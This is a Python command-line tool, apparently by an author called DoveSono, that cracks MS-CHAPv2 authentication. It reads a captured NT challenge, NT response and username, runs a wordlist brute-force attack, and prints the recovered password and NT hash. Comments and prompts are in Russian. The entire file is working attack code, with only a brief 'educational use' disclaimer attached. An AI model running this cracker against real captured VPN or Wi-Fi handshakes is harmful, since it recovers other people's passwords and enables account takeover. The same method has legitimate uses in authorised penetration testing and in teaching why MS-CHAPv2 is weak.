#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DoveSono MS-CHAPv2 Brute Force Tool
===================================
A tool for testing MS-CHAPv2 authentication security.
Use only for educational and security testing purposes!

Author: DoveSono
License: MIT
"""

import hashlib
from impacket.ntlm import compute_nthash
from binascii import unhexlify
import argparse
from Crypto.Cipher import DES
import sys
import os
from datetime import datetime

VERSION = "1.0.0"

def print_banner():
    banner = """
    ██████╗  ██████╗ ██╗   ██╗███████╗███████╗ ██████╗ ███╗   ██╗ ██████╗ 
    ██╔══██╗██╔═══██╗██║   ██║██╔════╝██╔════╝██╔═══██╗████╗  ██║██╔═══██╗
    ██║  ██║██║   ██║██║   ██║█████╗  ███████╗██║   ██║██╔██╗ ██║██║   ██║
    ██║  ██║██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║██║   ██║██║╚██╗██║██║   ██║
    ██████╔╝╚██████╔╝ ╚████╔╝ ███████╗███████║╚██████╔╝██║ ╚████║╚██████╔╝
    ╚═════╝  ╚═════╝   ╚═══╝  ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ 
    """
    print(banner)
    print(f"MS-CHAPv2 Brute Force Tool v{VERSION}")
    print("Используйте только для образовательных целей и тестирования безопасности!")
    print("=" * 80)

def str_to_key(s):
    """Преобразует 7-байтовую строку в 8-байтовый DES-ключ"""
    key = []
    key.append(s[0] >> 1)
    key.append(((s[0] & 0x01) << 6) | (s[1] >> 2))
    key.append(((s[1] & 0x03) << 5) | (s[2] >> 3))
    key.append(((s[2] & 0x07) << 4) | (s[3] >> 4))
    key.append(((s[3] & 0x0F) << 3) | (s[4] >> 5))
    key.append(((s[4] & 0x1F) << 2) | (s[5] >> 6))
    key.append(((s[5] & 0x3F) << 1) | (s[6] >> 7))
    key.append(s[6] & 0x7F)
    for i in range(8):
        key[i] = (key[i] << 1)
    return bytes(key)

def challenge_response(challenge, hash, debug=False):
    """Генерирует NT Response для MS-CHAPv2"""
    if isinstance(hash, str):
        hash = bytes.fromhex(hash)
    
    zpwd = hash + b'\x00' * (21 - len(hash))
    
    if debug:
        print(f"[DEBUG] Challenge (8 bytes): {challenge.hex()}")
        print(f"[DEBUG] Hash (16 bytes): {hash.hex()}")
        print(f"[DEBUG] ZPWD (21 bytes): {zpwd.hex()}")
    
    des_keys = []
    for i in range(0, 21, 7):
        key = str_to_key(zpwd[i:i+7])
        des_keys.append(key)
        if debug:
            print(f"[DEBUG] DES Key {i//7 + 1}: {key.hex()}")
    
    res = b''
    for i, key in enumerate(des_keys):
        des = DES.new(key, DES.MODE_ECB)
        encrypted = des.encrypt(challenge)
        res += encrypted
        if debug:
            print(f"[DEBUG] Encrypted block {i + 1}: {encrypted.hex()}")
    
    return res

def calc_challenge(peer_chal, auth_chal, username):
    """Вычисляет challenge для MS-CHAPv2"""
    sha = hashlib.sha1()
    sha.update(peer_chal + auth_chal + username.encode('utf-8'))
    return sha.digest()[:8]

def crack_mschap(nt_challenge, nt_response, wordlist_path, username):
    """Основная функция для взлома MS-CHAPv2"""
    if not os.path.exists(wordlist_path):
        print(f"[-] Ошибка: Файл словаря {wordlist_path} не найден")
        return None

    with open(wordlist_path, 'r', encoding='utf-8') as f:
        passwords = f.read().splitlines()
    
    nt_challenge = bytes.fromhex(nt_challenge)
    nt_response = bytes.fromhex(nt_response)
    
    peer_challenge = nt_response[0:16]
    nt_response = nt_response[24:48]
    
    challenge = calc_challenge(peer_challenge, nt_challenge, username)
    
    print(f"\n[*] Начинаем брутфорс с {len(passwords)} паролями...")
    print(f"[*] Auth Challenge: {nt_challenge.hex()}")
    print(f"[*] Peer Challenge: {peer_challenge.hex()}")
    print(f"[*] Challenge: {challenge.hex()}")
    print(f"[*] NT Response: {nt_response.hex()}")
    
    start_time = datetime.now()
    for i, password in enumerate(passwords, 1):
        if i % 1000 == 0:  # Показываем прогресс каждые 1000 паролей
            print(f"[*] Проверено паролей: {i}/{len(passwords)}")
        
        nthash = compute_nthash(password)
        calc_response = challenge_response(challenge, nthash)
        
        if calc_response.hex() == nt_response.hex():
            end_time = datetime.now()
            duration = end_time - start_time
            print(f"\n[+] Найден пароль: {password}")
            print(f"[+] NT Hash: {nthash.hex()}")
            # Повторяем вычисление с отладочной информацией
            print("\n[DEBUG] Детали успешного совпадения:")
            challenge_response(challenge, nthash, debug=True)
            print(f"[+] Время поиска: {duration}")
            return password
    
    end_time = datetime.now()
    duration = end_time - start_time
    print(f"\n[-] Пароль не найден")
    print(f"[*] Время поиска: {duration}")
    return None

def main():
    """Основная функция программы"""
    print_banner()
    
    try:
        nt_challenge = input("\n[?] Введите NT Challenge (hex): ").strip()
        nt_response = input("[?] Введите NT Response (hex): ").strip()
        username = input("[?] Введите имя пользователя: ").strip()
        wordlist = input("[?] Введите путь к файлу со словарем (по умолчанию wordlist.txt): ").strip()
        
        if not wordlist:
            wordlist = "wordlist.txt"
        
        print("\n[*] Проверка введенных данных...")
        print(f"[*] NT Challenge: {nt_challenge}")
        print(f"[*] NT Response: {nt_response}")
        print(f"[*] Username: {username}")
        print(f"[*] Wordlist: {wordlist}")
        
        try:
            bytes.fromhex(nt_challenge)
            bytes.fromhex(nt_response)
        except ValueError:
            print("[-] Ошибка: NT Challenge или NT Response содержат некорректные hex-значения")
            return
        
        print("\n[*] Запуск брутфорса...")
        crack_mschap(nt_challenge, nt_response, wordlist, username)
        
    except KeyboardInterrupt:
        print("\n\n[-] Программа прервана пользователем")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Произошла ошибка: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main() 